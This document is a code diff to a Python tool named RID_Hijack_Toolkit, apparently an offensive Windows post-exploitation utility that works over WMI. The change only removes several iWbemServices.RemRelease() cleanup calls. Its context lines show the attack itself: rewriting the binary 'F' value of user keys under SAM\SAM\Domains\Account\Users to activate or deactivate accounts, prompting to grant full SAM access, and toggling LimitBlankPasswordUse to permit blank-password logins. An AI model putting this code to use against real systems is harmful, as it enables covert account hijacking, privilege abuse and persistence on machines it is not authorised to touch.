@@ -45,7 +45,6 @@ class RID_Hijack_Toolkit():
                     pass
                 else:
                     break
-        iWbemServices.RemRelease()
 
     def Permissions_Controller(self, action, user, currentUsers):
         exec_command = EXEC_COMMAND(self.iWbemLevel1Login, codec="gbk")
@@ -118,7 +117,6 @@ class RID_Hijack_Toolkit():
                 print('[-] Looks like we have no permissions to access SAM\\SAM subkeys, please grant full access permissions with: -action "grant" or -action "grant-old" (2003)')
             else:
                 print('[-] Unknown error: %s'%(str(e)))
-            iWbemServices.RemRelease()
         else:
             if action == "remove":
                 print("[+] Remove user.")
@@ -161,8 +159,6 @@ class RID_Hijack_Toolkit():
                     print("[+] Deactivate target user.")
                 
                 StdRegProv.SetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(user)), 16), '08x')), 'F', result)
-            
-            iWbemServices.RemRelease()
 
     def backup_UserProfile(self, user, hostname, StdRegProv=None):
         if StdRegProv is None:
@@ -222,4 +218,3 @@ class RID_Hijack_Toolkit():
         elif action == "disable":
             StdRegProv.SetDWORDValue(2147483650, 'SYSTEM\\CurrentControlSet\\Control\\Lsa', 'LimitBlankPasswordUse', 1)
             print('[+] Disable blank password login.')
-        iWbemServices.RemRelease()
